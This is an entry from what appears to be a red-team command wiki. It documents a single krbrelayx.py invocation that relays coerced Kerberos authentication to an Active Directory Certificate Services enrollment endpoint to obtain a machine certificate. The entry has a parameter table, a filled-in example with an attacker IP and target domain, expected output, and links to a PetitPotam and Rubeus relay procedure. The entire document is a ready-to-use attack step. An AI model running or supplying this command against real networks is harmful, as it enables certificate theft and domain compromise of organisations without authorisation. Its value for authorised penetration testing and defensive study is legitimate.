---
id: 6261fd62-a4e9-4604-b843-93905c3730d4
name: setup-krbrelayx-adcs
type: command
executor: bash
data: >-
  sudo krbrelayx.py -t http://$_CA_SERVER/certsrv -ip $_ATTACKER_IP --victim
  $_TARGET_DOMAIN --adcs --template Machine
output: null
created_at: '2023-04-06T03:56:05.989395+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - kerberos-relay
  - ad-cs
verified: true
validated: true
---

# setup-krbrelayx-adcs

## Command

```bash
sudo krbrelayx.py -t http://$_CA_SERVER/certsrv -ip $_ATTACKER_IP --victim $_TARGET_DOMAIN --adcs --template Machine
```

## Description

Sets up a Kerberos relay to AD CS for certificate acquisition via coerced auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t http://$_CA_SERVER/certsrv | AD CS target URL | Yes |
| -ip $_ATTACKER_IP | Attacker IP for relay | Yes |
| --victim $_TARGET_DOMAIN | Victim domain | Yes |
| --adcs | AD CS mode | Yes |
| --template Machine | Certificate template | Yes |

## Examples

### Basic Setup

```bash
sudo krbrelayx.py -t http://CA/certsrv -ip 10.10.10.250 --victim target.domain.local --adcs --template Machine
```

## Expected Output

Kerberos relay server started
Listening for connections...

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/krbrelayx]]
